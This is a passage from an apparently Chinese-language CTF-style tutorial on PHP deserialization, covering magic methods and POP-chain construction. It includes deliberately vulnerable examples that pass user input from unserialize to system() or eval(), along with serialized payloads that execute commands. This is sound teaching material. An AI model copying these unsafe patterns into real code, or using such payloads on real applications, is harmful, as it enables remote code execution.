<span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$cmd</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里直接构造参数benben&#x3D;dir即可</p><p><strong>__wakeup()</strong></p><p>和sleep相反，<strong>unserialize()</strong> 会检查是否存在一个wakeup()方法。如果存在，则会先调用，wakeup()方法，预先准备对象需要的资源。预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p><img src="/../image/image-20240421183347881.png" alt="image-20240421183347881"></p><p><strong>例题</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421183634736.png" alt="image-20240421183634736"></p><p>可以看到本来没有赋值的password赋值了a</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>**O:4:”User”:1:{s:8:”username”;s:3:”dir”;}**，这里不用写全，因为最后也是调用wakeup只要用username即可，这句就相当于给username赋值</p><p><img src="/../image/image-20240421184030452.png" alt="image-20240421184030452"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><p>O:4:”xctf”:1:{s:4:”flag”:s:3:”111”;}</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><strong>__toString()</strong></h3><p>表达方式错误导致魔术方法触发，即把对象当成字符串 调用</p><p><strong>例子：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&#x27;格式不对，输出不了!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421185655678.png" alt="image-20240421185655678"></p><p>可以看到，在echo时，调用了toString方法。把类User实体化并赋值给$test,此时$test是个对象调用对象可以使用print_r或者var_dump如果使用echo或者print只能调用字符串的方式去调用对象即把对象当成字符串使用，此时自动触发tostring()，常用于构造POP链</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h3><p>这个是格式方法错误导致被调用。</p><p>例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span>  <span class="string">&#x27;它不是个函数!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span> -&gt;benben;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>() -&gt;benben;<span class="comment">//这里是把他当函数调用了</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421190435573.png" alt="image-20240421190435573"></p><p>把类User实体化并赋值给$test为对象正常输出对象里的值benben加()是把test当成函数test()来调用,此时触发invoke()</p><h3 id="错误调用属性和方法的魔术方法"><a href="#错误调用属性和方法的魔术方法" class="headerlink" title="错误调用属性和方法的魔术方法"></a>错误调用属性和方法的魔术方法</h3><h4 id="call"><a href="#call" class="headerlink" title="__call()"></a><strong>__call()</strong></h4><p>触发时机:调用一个不存在的方法</p><p>功能:</p><p>参数:2个参数传参$arg1,$arg2</p><p>返回值:调用的不存在的方法的名称和参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421192042597.png" alt="image-20240421192042597"></p><p>9调用的方法callxxx()不存在，触发魔术方法call(),传参$arg1,$arg2(callxxx,a)<br>$arg1,调用的不存在的方法的名称;</p><p>$arg2,调用的不存在的方法的参数;</p><h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421194930475.png" alt="image-20240421194930475"></p><p>触发时机:静态调用或调用成员常量时使用的方法不存在<br>参数:2个参数传参$arg1,$arg2</p><p>返回值:调用的不存在的方法的名称和参数<br> 静态调用::时的方法callxxx()不存在<br>触发callStatic()，传参$arg1,$arg2(callxxx,a)</p><h3 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h3><p>触发时机:调用的成员属性不存在</p><p>参数:传参$arg1</p><p>返回值:不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421200603830.png" alt="image-20240421200603830"></p><h3 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h3><p>和get相对的</p><p>触发时机:给不存在的成员属性赋值</p><p>参数:传参$arg1,$arg2</p><p>返回值:不存在的成员属性的名称和赋的值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span> ,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421200840341.png" alt="image-20240421200840341"></p><p>既要调用也要赋值</p><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p>触发时机:对不可访问属性使用 isset()或empty() 时，_isset()会被调用。</p><p>参数:传参$arg1</p><p>返回值:不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421203616902.png" alt="image-20240421203616902"></p><p>isset()调用的成员属性var不可访问或不存在,z这里是访问了私有属性的成员</p><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p>触发时机:对不可访问属性使用 unset()时</p><p>参数:传参$arg1</p><p>返回值:不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421204951446.png" alt="image-20240421204951446"></p><p>unset()调用的成员属性var不可访问或不存在<br>触发unset()返回$arg1,不存在成员属性的名称;</p><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421205119991.png" alt="image-20240421205119991"></p><p><img src="/../image/image-20240421205133831.png" alt="image-20240421205133831"></p><h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反推法：</p><p>利用点首先是在eval，这个是危险函数，然后eval的参数是test2，然后由action方法调用，往上找，normal类里也有个action，但不是魔术方法，不会自己调用，但可以发现index类里的destruct方法里会调用action，所以我们要给test赋值一个对象，也就是evil，所以构造时需要把test赋值成test，但前面construct也给test赋值了，但反序列化不会调用所以不管他，下面用代码构造payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&quot;system(&#x27;dir&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">index</span>());</span><br><span class="line"><span class="comment">#echo urlencode(serialize(new index()))</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>O:5:”index”:1:{s:11:”%00index%00test”;O:4:”evil”:1:{s:5:”test2”;s:14:”system(‘dir’);”;}}</strong></p><p>另一种方法,要在$test2是在public的情况下才可以用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;test2 = <span class="string">&quot;system(&#x27;ipconfig&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>魔术方法触发前提:魔术方法所在类(或对象)被调用</strong></p><p><img src="/../image/image-20240421214613496.png" alt="image-20240421214613496"></p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a><strong>__wakeup()</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup is here!!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tostring is here!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>目的是显示tosring is here!!，这就需要我们去构造一个把对象当字符串输出的例子，所以我们需要把sec()示例化成对象后当成字符串输出，在echo中的source</p><p><strong>构造</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">##highlight_file(__FILE__);</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sec</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fast</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;source = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421215643611.png" alt="image-20240421215643611"></p><h2 id="POP链构造和POC编写"><a href="#POP链构造和POC编写" class="headerlink" title="POP链构造和POC编写"></a>POP链构造和POC编写</h2><p>在<strong>反序列化</strong>中，我们能控制的数据就是对象中的属性值(成员变量)所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”即POP( Property Oriented Programming).</p><p><strong>POP链</strong>就是利用魔法方法在里面进行多次跳转然后获取敏感数据的-种payload。</p><p><strong>POC</strong>(全称:Proof of concept)中文译作概念验证。在安全界可以理解成漏洞验证程序。PoC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span 